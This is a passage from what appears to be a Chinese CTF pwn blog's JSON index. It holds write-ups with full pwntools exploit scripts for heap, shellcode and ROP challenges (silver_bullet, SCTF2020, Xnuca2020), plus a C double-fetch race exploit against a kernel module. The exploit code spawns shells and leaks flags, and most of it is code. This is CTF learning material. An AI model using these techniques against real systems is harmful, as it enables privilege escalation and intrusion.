ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote('chall.pwnable.tw',10103) libc = ELF('../libc_32.so.6')gdb.attach(p,'b*0x080489CF')p.recvuntil(':')p.sendline('1')p.recvuntil(&quot;:&quot;)p.send('a'*47)p.recvuntil(':')p.sendline('2')p.recvuntil(&quot;:&quot;)p.send('b')p.recvuntil(':')p.sendline('2')p.recvuntil(&quot;:&quot;)puts_plt = 0x80484a8puts_got = 0x804afdcfake_addr = 0x804b410pr_addr = 0x08048475lr_addr = 0x8048a18read_input = 0x80485ebpayload3 = '\\xff' * 3 + p32(fake_addr) + p32(puts_plt) + p32(pr_addr) + p32(puts_got) + p32(read_input) + p32(lr_addr) + p32(fake_addr) + p32(0x100)#gdb,attach(p)p.send(payload3)p.recvuntil(':')p.sendline('3')p.recvuntil('Oh ! You win !!\\n')puts_addr = u32(p.recv(4))system_addr = puts_addr - (libc.symbols['puts']-libc.symbols['system'])payload = 'a'*4 + p32(system_addr) + p32(0xdeadbeef) + p32(fake_addr + 0x10) + '/bin/sh'p.send(payload)p.interactive() 这题漏洞在于数据布局不规范以及strncat函数的结尾添加\\0的操作🕵️‍♀️","link":"/2020/10/17/Pwnable_silver_bullet/"},{"title":"SCTF2020","text":"0x01coolcode解法一16的一道pwn题，开了sandbox： 禁用open，但fstat函数系统调用号为5，想到利用retf控制cs修改运行模式为32位汇编（open在32位下调用号正好为5） 同时看到堆可执行： 0x1607000 0x1628000 rwxp 21000 0 [heap] 于是可以在堆上部shellcode，但输入堆的时候有check只能是数字和大写字母，且长度为0x20，因此一般的shellcode转化工具因太长无法使用，只能手撸。 能用的只能是部分xor和pop/push这样的指令，可以先构造执行read，之后的输入就没check的限制。 123456789101112131415sc = asm(''' xor al,0x41 xor byte ptr [rsi+0x48],al xor byte ptr [rsi+0x4b],al xor byte ptr [rsi+0x4c],al xor byte ptr [rsi+0x4a],al xor al,0x41 xor al,0x53 xor byte ptr [rsi+0x48],al push rbx push rbx pop rax ''') sc += 'M2WND' 利用xor和’M2WND’构造出syscall执行read(0,堆地址,size) ruan师傅 哦对了，跳到堆上执行的方法是利用idx为负数（-24）改write的got为堆地址，利用show()函数触发到堆上执行，之后执行了一次read会便可持续往下部署sellcode但要把控好距离。具体看脚本+调试： read（用于之后的shellcode写入）-&gt;mmap（申请映射空间用于读入flag）-&gt;open（利用retfq控制程序跳到映射空间执行32为汇编）-&gt;read-&gt;write exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114from pwn import *context.log_level='debug'context.arch='amd64'DEBUG=1if DEBUG: p=process(&quot;./CoolCode&quot;)def cmd(command): p.recvuntil(&quot; :&quot;) p.sendline(str(command))def add(idx,content): cmd(1) p.recvuntil(&quot;: &quot;) p.sendline(str(idx)) p.recvuntil(&quot;: &quot;) p.send(content)def dele(idx): cmd(3) p.recvuntil(&quot;: &quot;) p.sendline(str(idx))def show(idx): cmd(2) p.recvuntil(&quot;: &quot;) p.sendline(str(idx))def pwn(): gdb.attach(p) add(0,'O'*0x20) add(1,'O'*0x20) sc = asm(''' xor al,0x41 xor byte ptr [rsi+0x48],al xor byte ptr [rsi+0x4b],al xor byte ptr [rsi+0x4c],al xor byte ptr [rsi+0x4a],al xor al,0x41 xor al,0x53 xor byte ptr [rsi+0x48],al push rbx push rbx pop rax ''') sc += 'M2WND' add(-34,sc)# gdb.attach(p) show(1) #read() sc = asm(''' push r11 pop rdx xor rax,rax syscall ''') p.send(&quot;A&quot;*0x4d+'\\x90'*3+sc) pause() # mmap 0xcafe000 mmap(0xcafe000,0x1000,7,34,0,0) sc = asm(''' mov edi,0xcafe000 xor rsi,rsi mov esi,0x1000 xor rdx,rdx xor dl,7 push 0x22 pop r10 xor r8,r8 dec r8 xor rax,rax mov eax,9 syscall ''') # read(0,0xcafe000,0x100) sc += asm(''' mov rsp,0xcafe200 xor rdi,rdi xor rsi,rsi mov esi,0xcafe000 xor rdx,rdx mov edx,0x1000 xor rax,rax syscall retfq ''') pause() #gdb.attach(p) p.send(&quot;A&quot;*0x58+'\\x90'*2+sc) # open(flag) and 'add esp,8' and 'retf' sc = 'h\\x01\\x01\\x01\\x01\\x814$`f\\x01\\x01h./fl\\x89\\xe31\\xc91\\xd2j\\x05X\\xcd\\x80'+'\\x83\\xc4\\x08'+'\\xcb' sc = sc.ljust(0x80,&quot;\\x90&quot;) #read+write sc += asm(''' mov rdi,rax mov rsi,0xcafe400 mov rdx,0x100 xor rax,rax syscall mov rdi,1 xor rax,rax inc rax syscall ''') sc = sc.ljust(0x200,&quot;\\x90&quot;) sc += p64(0xcafe000)+p64(0x23)+p32(0xcafe080)+p32(0x33) gdb.attach(p) p.send(sc) #gdb.attach(p) pause() p.interactive()if __name__ == &quot;__main__&quot;: pwn() 解法二：这次我们先覆盖exit的got表为ret来绕过check,这样我们就可以直接在堆上写shellcode，然后覆盖free的got表，利用dele触发shellcode。 shellcode的编写过程就是先执行read将之后的shellcode读到bss段，之后retfq切换32位汇编并跳到bss上继续执行open_x86的操作，最后read and write读出flag。 要注意的几点： open函数的参数传递： eax = 0x05 系统调用号、ebx = filename 文件名、ecx = flags 置零即可、edx = mode 置零即可。 然后就是再构造文件名’flag’的时候由于是32的模式，要注意错位的问题。 还有就是注意理解retfq执行的操作为pop rip，pop cs（cs = 0x23代表32位模式，cs = 0x33代表64位模式），所以要注意栈中的参数位置。retfq跳转过去的时候程序已经切换成了32位模式，要注意平衡好esp的地址 最后还得回到64位模式下调用，再调用一次retfq。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576from pwn import *context.log_level='debug'#context.arch='amd64'DEBUG=1if DEBUG: p=process(&quot;./CoolCode&quot;)def cmd(command): p.recvuntil(&quot; :&quot;) p.sendline(str(command))def add(idx,content): cmd(1) p.recvuntil(&quot;: &quot;) p.sendline(str(idx)) p.recvuntil(&quot;: &quot;) p.send(content)def dele(idx): cmd(3) p.recvuntil(&quot;: &quot;) p.sendline(str(idx))def show(idx): cmd(2) p.recvuntil(&quot;: &quot;) p.sendline(str(idx))def pwn(): read = ''' xor eax,eax mov edi,eax push 0x60 mov esi,0x1010101 xor esi,0x1612601 syscall mov esp,esi retfq ''' open_x86 = ''' push 0x33 push 0x67616c66 push esp pop ebx xor ecx,ecx mov eax,5 int 0x80 ''' read_flag = ''' push 0x33 push 0x60272b retfq mov rdi,0x3 mov rsi,rsp mov rdx,0x60 xor rax,rax syscall mov rdi,1 mov rax,1 syscall ''' readflag=asm(read_flag,arch='amd64') add(-22,'\\xc3') add(-37,asm(read,arch='amd64')) #gdb.attach(p) dele(0) payload=p64(0x602710)+p64(0x23)+asm(open_x86)+readflag gdb.attach(p) p.sendline(payload) p.interactive()if __name__ == &quot;__main__&quot;: pwn() 0x02 snake程序是是一个贪吃蛇，当蛇死后的leave words存在堆溢出，正好可以伪造下一个堆的size。 利用思路： 首先既然可以伪造size就想办法构造overlap，先将存放name的chunk0删除，申请新的chunk0大小为0x68（为之后的fastbin attack）准备。 之后利用scanf输入很长的字符串触发malloc_consolidate()作用为： 1、检查fastbin是否初始化，如果未初始化，则进行初始化。 2、如果fastbin初始化，则按照一定的顺序合并fastbin中的chunk放入unsorted bin中 这样一来放入unsorted bin的堆内就存在执行main_arena的指针，然后将它申请回来利用get_name+restart泄露libc 之后再leave words时候修改chunk1（也就是最开始的chunk0）的size为0x91，造成chunk0和chunk1的overlop。 最后fastbin attack改malloc_hook到one_gadget拿shell。 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081from pwn import *context.log_level='debug'DEBUG=1if DEBUG: p=process(&quot;./snake&quot;) libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)def cmd(command): p.recvuntil(&quot;4.start name&quot;) p.sendline(str(command))def add(idx,sz,content): cmd(1) p.recvuntil(&quot;index?&quot;) p.sendline(str(idx)) p.recvuntil(&quot;long?&quot;) p.sendline(str(sz)) p.recvuntil(&quot;name?&quot;) p.send(content)def dele(idx): cmd(2) p.recvuntil(&quot;index?&quot;) p.sendline(str(idx))def get(idx): cmd(3) p.recvuntil(&quot;index?&quot;) p.sendline(str(idx))def pwn(): p.recvuntil(&quot;how long?&quot;) p.sendline(str(0x30)) p.recvuntil(&quot;name&quot;) p.send(&quot;asdasdasd&quot;) p.recvuntil(&quot;join&quot;) p.sendline(&quot;&quot;) pause() p.send(&quot;s&quot;*0x23) p.recvuntil(&quot;words:&quot;) p.send(&quot;A&quot;*0x20) p.recvuntil(&quot;exit?&quot;) p.send('n') #gdb.attach(p) dele(0) add(0,0x68,(p64(0)+p64(0x21))*6) cmd(2) p.recvuntil(&quot;index?&quot;) p.sendline(&quot;1&quot;*0x400) add(1,0x30,&quot;7&quot;) #gdb.attach(p) get(1) cmd(4) pause() p.send(&quot;s&quot;*0x23) p.recvuntil(&quot;player name: &quot;) libc.address = u64(p.recv(6)+'\\x00\\x00') - 0x3c4b37 #gdb.attach(p) p.recvuntil(&quot;words:&quot;) p.send(&quot;\\x00&quot;*0x4c+'\\x91') info(&quot;libc : &quot; + hex(libc.address)) #gdb.attach(p) p.recvuntil(&quot;exit?&quot;) p.send('n') dele(1) dele(0)# gdb.attach(p) add(0,0x50,&quot;\\x00&quot;*0x38+p64(0x71)+p64(libc.symbols[&quot;__malloc_hook&quot;]-0x23)) gdb.attach(p) add(0,0x68,'a') payload = &quot;\\x00&quot;*0xb+p64(libc.address+0xf02a4)*2 add(1,0x68,payload) dele(1) #gdb.attach(p) p.interactive()if __name__ =='__main__': pwn()","link":"/2020/07/07/SCTF2020/"},{"title":"Xnuca2020线上赛l","text":"Xnuca2020线上赛 比赛时pwn题都是ruan解的tttttql😍，我TM直接化身ruan师傅迷弟。不亏是中科院，收获满满。 defile这题在听了ruan师傅讲解之后才终于搞明白了🙆‍♂️题目给出了源码，编译好的elf文件，makefile，查看makefile发现gcc defile.c -o defile -lseccomp -g，开了seccomp以及给出了调试符号，意味着我们可以源码调试了。 接下来就是阅读源代码了，逻辑大概是这样的（如有错误请务必指正）：程序首先mmap一块较大(4096)的shared空间，接下来fork出子进程。该子进程的任务是首先让我们向shared输入4094大小的内容，之后循环(while(1))的fork出孙子进程(相对于父进程而言)，fork出的孙子进程会执行我们的输入也即shellcode，执行完后就exit(0)，之后子进程在继续fork，循环上述的执行。 这里要注意的一点是再孙子进程跳去执行shellcode的时候: 1234567891011121314151617181920uint64_t targetaddr = (uint64_t)shared + (i % 2) * ((4096 - 2) / 2); __asm__( &quot;mov $0xdeadbeefdeadbeef, %%rax\\n\\t&quot; &quot;mov $0xdeadbeefdeadbeef, %%rbx\\n\\t&quot; &quot;mov $0xdeadbeefdeadbeef, %%rcx\\n\\t&quot; &quot;mov $0xdeadbeefdeadbeef, %%rdi\\n\\t&quot; &quot;mov $0xdeadbeefdeadbeef, %%rsi\\n\\t&quot; &quot;mov $0xdeadbeefdeadbeef, %%r8\\n\\t&quot; &quot;mov $0xdeadbeefdeadbeef, %%r9\\n\\t&quot; &quot;mov $0xdeadbeefdeadbeef, %%r10\\n\\t&quot; &quot;mov $0xdeadbeefdeadbeef, %%r11\\n\\t&quot; &quot;mov $0xdeadbeefdeadbeef, %%r12\\n\\t&quot; &quot;mov $0xdeadbeefdeadbeef, %%r13\\n\\t&quot; &quot;mov $0xdeadbeefdeadbeef, %%r14\\n\\t&quot; &quot;mov $0xdeadbeefdeadbeef, %%r15\\n\\t&quot; &quot;jmp *%%rdx\\n\\t&quot; : :&quot;d&quot;(targetaddr) : ); 可见是有两个入口地址的一个是shared，另一个是shared+2046，也即4096的空间里应该有我们两部分相同的shellcode。 父进程所作的就是通过random生成一段128长度的随机数，并且进行128轮次的循环。每一轮所做的就是比较shared+4095和key[i]的大小，如果相等就往shared+offset(也是随机数)写入0xcccccccccccccccc来破坏我们的shellcode，然后再比较shared+0x4094是否为1，相等则才进行下一轮的比较。执行完128轮之后程序会从pipe里读出128的内容于key比较，相同就给我们flag了。 这样看下来我们的shellcode所要完成的功能为： 1.shared+4095==key[i]，需要循环爆破。 2.shared+4095==1 3.write(pipe,&amp;key[i],1)。 由于0xcccccccccccccccc的写入我们可以有这样的思路：首先从0开始循环增加的向shared+4095写入，每次写入之后都对shellcode进行检查，如果没有0xcccccccccccccccc的出现说明还没爆破到，若有0xcccccccccccccccc说明爆破到了key，之后由于我们再该空间内有两端相同的shellcode，因此可以通过偏移的相对位置利用未被写入0xcccccccccccccccc的那段来修复写入0xcccccccccccccccc的那段shellcode，之后构造write(pipe,&amp;key[i],1)向管道写入Key值，之后exit()。 对应的汇编如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657code = &quot;&quot;&quot; and rdx,0xfffffffffffff000 add rdx,0xe jmp rdx xor rbx,rbx xor rax,rax and rdx,0xfffffffffffff000 mov byte ptr [rdx+0xfff],blloop_: call check mfence call check cmpw cx,0x200 jne find inc bl mov byte ptr [rdx+0xfff],bl cmpb bl,0 jne loop_find: mov ax,cx cmpw cx,0x100 jle l1 sub ax,0x100 jmp l2l1: add ax,0x100l2: mov r11,[rdx+rax*8] mov qword ptr [rdx+rcx*8],r11 push rbx mov rsi,rsp mov edi,4 mov r12,rdx xor rdx,rdx inc rdx mov rax,rdx syscall mov byte ptr [r12+0xffe],1 xor rdi,rdi mov rax,0xe7 syscallcheck: xor rcx,rcxfind_cc: movabsq r11,-3689348814741910324 cmpq qword ptr [rdx + rcx*8],r11 je find_ inc rcx cmpw cx,0x200 jne find_cc retfind_: ret&quot;&quot;&quot; 开始的时候我们只call check了一次，这样会出现一个问题就是当我们爆破到了key但call check时，父进程还没完成0xcccccccccccccccc的写入导致call check返回0，使得写入的shared+4095会比key大1，为了解决父子进程这种可能的速度差异，我们选择使用了两次call check。 完整exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103from pwn import *context.log_level='debug'context.arch='amd64'def debug(addr,PIE=True): if PIE: text_base = int(os.popen(&quot;pmap {}| awk '{{print $1}}'&quot;.format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *{}'.format(hex(text_base+addr))) else: gdb.attach(p,&quot;b *{}&quot;.format(hex(addr)))def main(host,port=40001): global p if host: p=remote(host,port) p.recvuntil(&quot;INPUT YOUR TOKEN:&quot;) p.send(&quot;icq95bbff617706a68d47723be2f12b7&quot;) else: p=process(&quot;./defile&quot;) # debug(0x1A4F) # pause() # pause() # gdb.attach(p) shellcode=code = &quot;&quot;&quot; and rdx,0xfffffffffffff000 add rdx,0xe jmp rdx xor rbx,rbx xor rax,rax and rdx,0xfffffffffffff000 mfence mov byte ptr [rdx+0xfff],bl mfence mfence loop_: call check mfence call check cmpw cx,0x200 jne find inc bl mfence mov byte ptr [rdx+0xfff],bl mfence cmpb bl,0 jne loop_ find: mov ax,cx cmpw cx,0x100 jle l1 sub ax,0x100 jmp l2 l1: add ax,0x100 l2: mov r11,[rdx+rax*8] mov qword ptr [rdx+rcx*8],r11 push rbx mov rsi,rsp mov edi,4 mov r12,rdx xor rdx,rdx inc rdx mov rax,rdx syscall mov byte ptr [r12+0xffe],1 xor rdi,rdi mov rax,0xe7 syscall check: xor rcx,rcx find_cc: movabsq r11,-3689348814741910324 cmpq qword ptr [rdx + rcx*8],r11 je find_ inc rcx cmpw cx,0x200 jne find_cc ret find_: ret &quot;&quot;&quot; p.recvuntil(&quot;:&quot;) code=asm(shellcode).ljust(2046,'\\x90') # code=(asm(shellcode)).encode('hex') p.send('\\x90'+code+'\\x90'*2+code[:-11]+'\\x00'*10) # p.recvuntil(&quot;SUCCEED&quot;) # gdb.attach(p) p.interactive()if __name__ == '__main__': # main(&quot;39.97.171.121&quot;) for i in range(0x20): try: main(0) except: p.close() cpp Heap exploiting is so boring . 一道c++写的菜单题，由于没有对指针的清零导致我们可以一直dele，因此我们可以一直dele来填满tecache，从而进入fastibin。 题目限制了malloc的size，但我们可以利用basic_string扩容的规则来触发malloc_consolidate，来得到存放有main_arena的bins。 12345678910111213141516create_des()create_des()create_des()write_des('a'*0x30)for i in range(8): del_des()write_des('a'*0x60)for i in range(8): del_des()write_des('a'*0x70)for i in range(8): del_des()write_des('a'*0x50)for i in range(8): del_des()write_des('a'*0x500) 效果： 12345678910111213141516171819202122232425262728pwndbg&gt; binstcachebins0x20 [ 2]: 0x555a28604e90 ◂— 0x555a28604e900x30 [ 1]: 0x555a28604f60 ◂— 0x00x40 [ 7]: 0x555a28604eb0 —▸ 0x7f6268435cd0 (main_arena+144) —▸ 0x7f6268435cc0 (main_arena+128) —▸ 0x7f6268435cb0 (main_arena+112) —▸ 0x7f6268435ca0 (main_arena+96) —▸ 0x555a28605870 ◂— 0x00x50 [ 1]: 0x555a28604f90 ◂— 0x00x60 [ 7]: 0x555a28605160 —▸ 0x555a28604ea0 ◂— 0x00x70 [ 7]: 0x555a28605070 —▸ 0x7f6268435de0 (main_arena+416) —▸ 0x7f6268435dd0 (main_arena+400) —▸ 0x7f6268435dc0 (main_arena+384) —▸ 0x7f6268435db0 (main_arena+368) —▸ 0x7f6268435da0 (main_arena+352) —▸ 0x7f6268435d90 (main_arena+336) —▸ 0x7f6268435d80 (main_arena+320) ◂— ...0x80 [ 7]: 0x555a286050e0 ◂— 0x00x90 [ 1]: 0x555a28604fe0 ◂— 0x00x100 [ 1]: 0x555a286051c0 ◂— 0x00x1f0 [ 1]: 0x555a286052c0 ◂— 0x00x3d0 [ 1]: 0x555a286054b0 ◂— 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbins0x40: 0x555a28604ea0 —▸ 0x7f6268435cd0 (main_arena+144) ◂— 0x555a28604ea00x150: 0x555a28605060 —▸ 0x7f6268435de0 (main_arena+416) ◂— 0x555a28605060 /* '`P`(ZU' */largebinsempty 之后就是劫持stdout泄露了，利用small bin和0x40的tecache的overlop改main_arena的后低两个字节，但要先把0x20的tecache申请出来。 leak的时候有个问题要注意： 123456789101112131415161718192021222324252627282930313233pwndbg&gt; binstcachebins0x30 [ 1]: 0x561f2bafef60 ◂— 0x00x40 [ 7]: 0x561f2bafeeb0 —▸ 0x7fc5c83ae758 (_IO_2_1_stderr_+216) —▸ 0x7fc5c83aa2a0 (_IO_file_jumps) ◂— 0x00x50 [ 1]: 0x561f2bafef90 ◂— 0x00x60 [ 7]: 0x561f2baff160 —▸ 0x561f2bafeea0 ◂— 0x00x70 [ 7]: 0x561f2baff070 —▸ 0x7fc5c83adde0 (main_arena+416) —▸ 0x7fc5c83addd0 (main_arena+400) —▸ 0x7fc5c83addc0 (main_arena+384) —▸ 0x7fc5c83addb0 (main_arena+368) —▸ 0x7fc5c83adda0 (main_arena+352) —▸ 0x7fc5c83add90 (main_arena+336) —▸ 0x7fc5c83add80 (main_arena+320) ◂— ...0x80 [ 7]: 0x561f2baff0e0 ◂— 0x00x90 [ 1]: 0x561f2bafefe0 ◂— 0x00x100 [ 1]: 0x561f2baff1c0 ◂— 0x00x1f0 [ 1]: 0x561f2baff2c0 ◂— 0x00x3d0 [ 1]: 0x561f2baff4b0 ◂— 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x561f2bafeec0 —▸ 0x7fc5c83adca0 (main_arena+96) ◂— 0x561f2bafeec0smallbins0x150: 0x561f2baff060 —▸ 0x7fc5c83adde0 (main_arena+416) ◂— 0x561f2baff060largebinsemptypwndbg&gt; x/20gx 0x561f2bafeeb0-0x100x561f2bafeea0: 0x0000000000000000 0x00000000000000210x561f2bafeeb0: 0x00007fc5c83ae758 0x00007fc5c83adcd00x561f2bafeec0: 0x6161616161616161 0x00000000000000210x561f2bafeed0: 0x00007fc5c83adca0 0x00007fc5c83adca0 在改了main_arena之后unsortedbin里的bin和0x40的第一个tecache是overlop的，这时如果我们直接取0x40的tecache和话就应注意不要改坏unsorted bin的结构，或者我们可以先把unsortedbin申请空在取0x40的tecache，这样就没什么问题了。 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566from pwn import *context.log_level='debug'def cmd(command): p.recvuntil(&quot;[B]ye&quot;) p.send(str(command))def create_des(): cmd('C')def write_des(content): cmd('W') sleep(0.1) p.sendline(content)def del_des(): cmd('D')def main(host,port=1234): global p if host: p=remote(host,port) else: p=process(&quot;./cpp&quot;,env={&quot;LD_PRELOAD&quot;:&quot;/home/an9ela/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc-2.27.so&quot;}) create_des() create_des() create_des() write_des('a'*0x30) for i in range(8): del_des() write_des('a'*0x60) for i in range(8): del_des() write_des('a'*0x70) for i in range(8): del_des() write_des('a'*0x50) for i in range(8): del_des() write_des('a'*0x500) write_des('\\x00'*8) write_des('\\x00'*8) # for i in range(4): # del_des() gdb.attach(p) stdout=int(raw_input(&quot;input: &quot;),16) write_des(p16(stdout-8)) write_des('\\x00') write_des(p64(0)*3+p64(0x21)+'\\x00'*0x10) write_des('a'*8+p64(0xfbad1800)+p64(0)*3+'\\x00') libc.address=u64(p.recvuntil('\\x7f')[-6:].ljust(8,'\\x00'))-0x3ed8b0 success(&quot;libc: &quot;+hex(libc.address)) write_des(p64(libc.sym['__free_hook'])) write_des('a'*0x60) write_des(p64(libc.sym['system'])+'\\x00'*0x58) write_des('/bin/sh'+'\\x00'*0x20) gdb.attach(p) p.interactive()if __name__ == '__main__': libc=ELF(&quot;/home/an9ela/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc-2.27.so&quot;) main(0)","link":"/2020/11/04/Xnuca2020%E7%BA%BF%E4%B8%8A%E8%B5%9B/"},{"title":"I am back","text":"考研结束有一段时间了，也休息调整的差不多了，是时候重启更新计划了🛡","link":"/2022/02/21/iamback/"},{"title":"kernel_pwn Double_fetch","text":"kernel_pwn Double_fetch wiki上kernel部分的第三道题目，来自0ctf2018 final_baby 这题不太一样的是没有给bzlmage,只给了.ko文件和core.cpio。通过ida打开ko文件查看hex view可以发现内核版本为4.15.0-22-generic SMP mod_unload。我偷懒直接从p4nda师傅的github上搞了一个，写个shell文件就可以qemu起了。 .ko文件分析： 123456__int64 init_module(){ _fentry__(); misc_register(&amp;baby); return 0LL;} init_module()里执行了misc_register()在/dev目录下建立了baby结点，并定义为杂项设备，该设备共享主设备号和open函数调用，有点类似上一篇的core。 1234567891011121314151617181920212223242526272829303132333435363738394041424344__int64 __fastcall baby_ioctl(__int64 a1, int a2){ __int64 v2; // rdx __int64 v3; // rcx __int64 result; // rax unsigned __int64 v5; // kr10_8 int i; // [rsp-5Ch] [rbp-5Ch] __int64 v7; // [rsp-58h] [rbp-58h] _fentry__(); v7 = v2; if ( a2 == 0x6666 ) { printk(&quot;Your flag is at %px! But I don't think you know it's content\\n&quot;, flag, v2, v3); result = 0LL; } else if ( a2 == 0x1337 &amp;&amp; (unsigned __int8)_chk_range_not_ok( v2, 16LL, *(_QWORD *)(__readgsqword((unsigned __int64)&amp;current_task) + 4952)) != 1 &amp;&amp; (unsigned __int8)_chk_range_not_ok( *(_QWORD *)v7, *(int *)(v7 + 8), *(_QWORD *)(__readgsqword((unsigned __int64)&amp;current_task) + 4952)) != 1 &amp;&amp; *(_DWORD *)(v7 + 8) == strlen(flag) ) { for ( i = 0; ; ++i ) { v5 = strlen(flag) + 1; if ( i &gt;= v5 - 1 ) break; if ( *(_BYTE *)(*(_QWORD *)v7 + i) != flag[i] ) return 22LL; } printk(&quot;Looks like the flag is not a secret anymore. So here is it %s\\n&quot;, flag, flag, ~v5); result = 0LL; } else { result = 14LL; } return result;} baby_ioctl()就类似于main函数了，主要完成的功能是对第二个参数进行检查，若为0x6666，就输出内核里flag的地址；如果为0x1337就会进行三个检查_chk_range_not_ok()函数就是检查a1+a2&gt;a3是否成立。 寄存器状态： 123456$rdx : 0x00007ffffffff000 → 0x00007ffffffff000$rsi : 0x0000000000000010 → 0x0000000000000010$rdi : 0x00007ffd64e1d780 → 0x00007ffd64e1d790 → 0x6373205d30383138 → 0x6373205d30383138gef➤ x/20gx 0x00007ffd64e1d7800x7ffd64e1d780: 0x00007ffd64e1d790 0x0000000000000021 //传入的结构体 通过调试我们可以发现，v2/v7就是是我们传入的结构体，而a3则是一个固定的地址0x7ffffffff000，这个地址是用户空间和内核空间的边界地址，因此我们可以想到该函数就是判断a1+a2的是否在用户空间。结构体： 1234struct attr{ char *flag; //flag的地址 size_t flag_len;}; 第一个check是我们输入的结构体是否在用户空间，第二个check是flag是否在用户空间，第三个check是我们结构体的flag_len是否和真正flag长度相等。过了check之后会将我们输入的flag的地址里的内容和内核里的flag进行比较，相同最终就会输出flag。分析下来我们发现，内核得到的是一个结构体的指针，而结构体的内容是存放在用户空间的。我们可以先通过0x6666得到flag在内核里的地址，但如果我们在传入的结构体里写入该地址的话就无法通过第二个check（因为该flag在内核空间）。这里就用到了doubel_fetch方法。原理摘自CTF_WIKI： 123Double Fetch 从漏洞原理上属于条件竞争漏洞，是一种内核态与用户态之间的数据访问竞争。在 Linux 等现代操作系统中，虚拟内存地址通常被划分为内核空间和用户空间。内核空间负责运行内核代码、驱动模块代码等，权限较高。而用户空间运行用户代码，并通过系统调用进入内核完成相关功能。通常情况下，用户空间向内核传递数据时，内核先通过通过 copy_from_user 等拷贝函数将用户数据拷贝至内核空间进行校验及相关处理，但在输入数据较为复杂时，内核可能只引用其指针，而将数据暂时保存在用户空间进行后续处理。此时，该数据存在被其他恶意线程篡改风险，造成内核验证通过数据与实际使用数据不一致，导致内核代码执行异常。 因此我们可以先在结构体的flag位置写入用户空间的地址，在创建一个恶意线程，该线程的任务就是不断的修改我们的flag地址为内核地址，如果该修改操作发生在通过check后，那么就可以通过后面的依次比较从而输出flag。 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;#include&lt;unistd.h&gt;#include&lt;sys/types.h&gt;#include&lt;sys/ioctl.h&gt;#include&lt;sys/stat.h&gt;#include&lt;fcntl.h&gt;#include&lt;inttypes.h&gt;#include&lt;pthread.h&gt;int finish=0;uint64_t addr;struct attr{ char *flag; int len;};void change_attr(void *s){ struct attr *s1=s; if(finish==0){ s1-&gt;flag=addr; }}int main(){ char buf[0x1000]={0}; char *ptr; struct attr t; pthread_t t1; int fd=open(&quot;/dev/baby&quot;,0); ioctl(fd,0x6666); setvbuf(stdin,0,2,0); setvbuf(stdout,0,2,0); setvbuf(stderr,0,2,0); system(&quot;dmesg &gt; /tmp/record.txt&quot;); int addr_fd=open(&quot;/tmp/record.txt&quot;,O_RDONLY); lseek(addr_fd,-0x1000,SEEK_END); //control the position of r/w read(addr_fd,buf,0x1000); close(addr_fd); ptr=strstr(buf,&quot;Your flag is at &quot;); if(ptr==0){ puts(&quot;Not found&quot;); exit(0); } else{ ptr+=16; addr=strtoull(ptr,ptr+16,16); printf(&quot;flag addr: %p&quot;,addr); } t.flag=buf; t.len=33; pthread_create(&amp;t1,NULL,change_attr,&amp;t); //创建线程 for(int i=0;i&lt;0x500;i++){ ioctl(fd,0x1337,&amp;t); t.flag=buf; //更新flag地址增大成功概率 } finish=1; pthread_join(t1,NULL); //等待线程结束 close(fd); system(&quot;dmesg | grep flag&quot;); return 0;} 补充：编译时要多加-pthread选项gcc exp.c -pthread -static -o exploitgef attach的命令gef-remote -q localhost:1234关闭地址随机化方法：在-append最后加上 nokaslr 参考：https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/double-fetch-zh/https://x3h1n.github.io/2019/08/27/20180ctf-final-baby/","link":"/2020/11/08/kernel_pwn(2)/"},{"title":"kernel_pwn ROP","text":"kernel 通常一个内核由负责响应中断的中断服务程序，负责管理多个进程从而分享处理器时间的调度程序，负责管理进程地址空间的内存管理程序，进程间通讯等系统服务程序共同组成。 –linux内核设计与实现 一直想学kernel pwn，但迟迟没有开始（懒🤦）。最近又心血来潮，翻开了linux内核设计与实现这本书，准备看这本来入门kernel。这将会是一个系列，记录下自己的学习过程（读书笔记+kernel_pwn题目复现），希望自己可以坚持下去🎃。 kernel顾名思义是操作的核心，它其实起到了一个承上（用户空间）启下（硬件设备）的作用。应用程序通过系统调用来与内核通信，内核通过处理中断（通过中断号找中断服务程序）来管理系统的硬件设备。注意：很多操作系统的中断服务程序，包括linux，都不在进程上下文中执行；而是在专门的中断上下文中运行，与所有进程都无关。 kernel_pwn_ROP 题目来自qwd2018_core。 就ctf里kernel pwn而言我们所要做的就是提权（得到一个root权限的进程）。挖掘出存在于kernel模块里的漏洞并通过用户态的相应的系统调用进到内核态中去触发漏洞从而到达提权的目的。直接撸题✔解压之后可以看到这些文件：bzImage：压缩后的内核镜像vmlinux：编译出的原始内核文件，没有被压缩而且是静态连接的。.sh：qemu的启动脚本.cpio：打包后的文件系统 我们首先看下.sh文件： 12345678qemu-system-x86_64 \\-m 64M \\-kernel ./bzImage \\-initrd ./core.cpio \\-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \\-s \\-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\-nographic \\ 解释下参数： 1234567-m 指定内存(RAM)大小-kernel 指定内核镜像-initrd 指定内核启动的文件系统-qppend 附加选项 指定no kaslr可以关闭地址随机化-s 相当于-gdb tcp::1234，可以用gdb ./vmlinux调试-smp 用于声明所有可能用到的cpus, i.e. sockets cores threads = maxcpus.-cpu 设置CPU的安全选项 